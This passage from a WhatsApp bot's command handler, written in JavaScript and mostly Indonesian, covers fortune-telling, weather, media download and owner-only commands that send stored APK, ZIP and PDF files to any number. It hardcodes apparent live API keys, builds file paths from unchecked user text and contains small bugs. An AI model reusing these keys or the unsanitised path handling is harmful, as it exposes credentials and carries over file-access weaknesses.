case "asupan20":{
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
reply('*Ah Males Sangean*')
}
break
//=================================================//
case "darkjoke": case "darkjokes":
await loading()
 var ress = await Darkjokes()
teks = "*Darkjokes*"
zetsubo.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:m })
break
//=================================================//
case 'emojimix': { 
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await zetsubo.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await zetsubo.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 7, 7, 2005, Putri, 16, 11, 2004`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} ZetsuboXygen`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} ZetsuboXygen|Putri`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
}
break
//=================================================//
case 'rejeki': case 'rezeki': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'pekerjaan': case 'kerja': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
}
break
//=================================================//
case 'potensipenyakit': case 'penyakit': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artitarot': case 'tarot': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'fengshui': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
 let [nama, gender, tahun] = text.split`,`
 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
}
break
//=================================================//
case 'haribaik': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harisangar': case 'taliwangke': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'harinaas': case 'harisial': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
}
break
//=================================================//
case 'weather':{
if (!text) return replygc('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           zetsubo.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
//=================================================//
case 'arahrejeki': case 'arahrezeki': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'peruntungan': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
 let [nama, tgl, bln, thn, untuk] = text.split`,`
 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'git': case 'gitclone':
if (!args[0]) return replygc(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    zetsubo.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxeon(mess.error))
break
//=================================================//
case 'sifat': case 'karakter': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
}
break
//=================================================//
case 'translate':{
  	if (!q) return reply(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       reply(result.text)
    } catch (e) {
        return reply(err)
    } 
    }
    break
//=================================================//
case 'play':
    case 'play2': {
        if (!text) {
            reply('𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐬𝐞𝐚𝐫𝐜𝐡 𝐭𝐞𝐫𝐦!\n𝐄.𝐠: 𝙷𝙴𝙰𝙳𝙻𝙸𝙶𝙷𝚃𝚂 𝙱𝚈 𝙰𝙻𝙰𝙽 𝚆𝙰𝙻𝙺𝙴𝚁')
            return;
        }
        try {
            const {
                videos
            } = await yts(text);
            if (!videos || videos.length <= 0) {
                reply(`No Matching videos found for : *${args[0]}*!!`)
                return;
            }
            let urlYt = videos[0].url
            let infoYt = await ytdl.getInfo(urlYt);
            //30 MIN
            if (infoYt.videoDetails.lengthSeconds >= 1800) {
                reply(`𝑷𝒍𝒆𝒂𝒔𝒆 𝒔𝒊𝒓\𝑰'𝒎 𝒏𝒐𝒕 𝒂𝒃𝒍𝒆 𝒕𝒐 𝒅𝒐𝒘𝒏𝒍𝒐𝒂𝒅 𝒕𝒉𝒂𝒕 𝒇𝒊𝒍𝒆. 🧞‍♂️`);
                return;
            }
            const getRandonm = (ext) => {
                return `${Math.floor(Math.random() * 10000)}${ext}`;
            };
            let titleYt = infoYt.videoDetails.title;
            let randomName = getRandonm(".mp3");
            const stream = ytdl(urlYt, {
                    filter: (info) => info.audioBitrate == 160 || info.audioBitrate == 128,
                })
                .pipe(fs.createWriteStream(`./${randomName}`));
            console.log("Audio downloading ->", urlYt);
            // reply("Downloading.. This may take upto 5 min!");
            await new Promise((resolve, reject) => {
                stream.on("error", reject);
                stream.on("finish", resolve);
            });
            
            let stats = fs.statSync(`./${randomName}`);
            let fileSizeInBytes = stats.size;
            // Convert the file size to megabytes (optional)
            let fileSizeInMegabytes = fileSizeInBytes / (1024 * 1024);
            console.log("Audio downloaded ! \n Size: " + fileSizeInMegabytes);
            if (fileSizeInMegabytes <= 40) {
                //sendFile(from, fs.readFileSync(`./${randomName}`), msg, { audio: true, jpegThumbnail: (await getBuffer(dl.meta.image)).buffer, unlink: true })
                await zetsubo.sendMessage(
                    from, {
                        document: fs.readFileSync(`./${randomName}`),
                        mimetype: "audio/mpeg",
                        fileName: titleYt + ".mp3",
			caption: "➻ 𝐁𝐘 𝐂𝐋𝐀𝐒𝐒𝐈𝐂_𝐁𝐎𝐓 ❖ ",    
                    }, {
                        quoted: m 
                    }
                );
            } else {
                reply(`File size bigger.`);
            }
            fs.unlinkSync(`./${randomName}`);
        } catch (e) {
            reply(e.toString())
        }
    }
break;
//=================================================//
case 'masasubur': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix+ command} 7 7 2005`
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') throw date
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'shio': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
await loading()
 if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
 let anu = await primbon.shio(text)
 if (anu.status == false) return reply(anu.message)
 zetsubo.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================//
case 'setcmd': {
if (!isCreator) return reply('*Premium Only*')
await loading()
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
reply(`Done!`)
}
break
//=================================================//
case 'delcmd': {
if (!isCreator) return reply('*Premium Only*')
await loading()
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
reply(`Done!`)
}
break
//=================================================//
case 'delpdf':{
if (!isCreator) return m.reply('*Khusus Owner Bot*')
await loading()
if (args.length < 1) return reply('Masukan query')
var teks = text
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
//=================================================//
case 'delpdf':{
if (!isCreator) return reply('*Premium Only*')
await loading()
if (args.length < 1) return reply('Masukan query')
var teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break
//=================================================//
case 'listpdf': {
if (!isCreator) return reply('*Premium Only*')
await loading()
let teksoooo = '┌──⭓「 *LIST PDF* 」\n┃\n'
for (let x of docunye) {
teksoooo = `┃⭔ ${x}\n`
}
teksoooo = `┃\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf zetsubo + sambil reply pesan target* \n\n Contoh 2 : yopdf zetsubo`
reply(teksoooo)
}
break
//=================================================//
case 'yopdf':{
if (!isCreator) return reply('*Premium Only*')
await loading()
var teks = `${text}`
{
zetsubo.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendpdf': {
if (!isCreator) return reply('*Premium Only*')
await loading()
if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
var teks = `${text}`
{
zetsubo.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addzip':{
if (!isCreator) return reply('*Premium Only*')
await loading()
if (args.length < 1) return reply('Nama zip apa')
var teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await zetsubo.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break
//=================================================//
case 'delzip':{
if (!isCreator) return reply('*Premium Only*')
await loading()
if (args.length < 1) return reply('Masukan text yang ada di list zip')
var teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break
//=================================================//
case 'listzip': {
if (!isCreator) return reply('*Premium Only*')
await loading()
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n┃\n'
for (let x of zipnye) {
teksooooo = `┃⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip Zetsubo + sambil reply pesan target* \n\n Contoh 2 : yozip zetsubo`
reply(teksooooo)
}
break
//=================================================//
case 'yozip':{
if (!isCreator) return reply('*Premium Only*')
await loading()
if (args.length < 1) return reply('Masukan text yang ada di list zip')
var teks = `${text}`
{
zetsubo.sendMessage(from, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendzip': {
if (!isCreator) return reply('*Premium Only*')
await loading()
if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
var teks = `${text}`
{
zetsubo.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addapk':{
if (!isCreator) return reply('*Premium Only*')
await loading()
if (args.length < 1) return reply('Nama apk apa')
var teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await zetsubo.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break
//=================================================//
case 'delapk':{
if (!isCreator) return reply('*Premium Only*')
await loading()
if (args.length < 1) return reply('Masukan text yang ada di listapk')
var teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break
//=================================================//
case 'listapk': {
if (!isCreator) return reply('*Premium Only*')
await loading()
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk zetsubo + sambil reply pesan target* \n\n Contoh 2 : yoapk zetsubo`
reply(teksoooooo)
}
break
//=================================================//
case 'yoapk':{
if (!isCreator) return reply('*Premium Only*')
await loading()
if (args.length < 1) return reply('Masukan text yang ada di listapk')
var teks = `${text}`
{
zetsubo.sendMessage(from, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break
//=================================================//
case 'sendapk': {
if (!isCreator) return reply('*Premium Only*')
await loading()
if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
var teks = `${text}`
{
zetsubo.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break
//=================================================//
case 'addvn':{
if (!isCreator) return reply('*Premium Only*')
await loading()
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await zetsubo.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
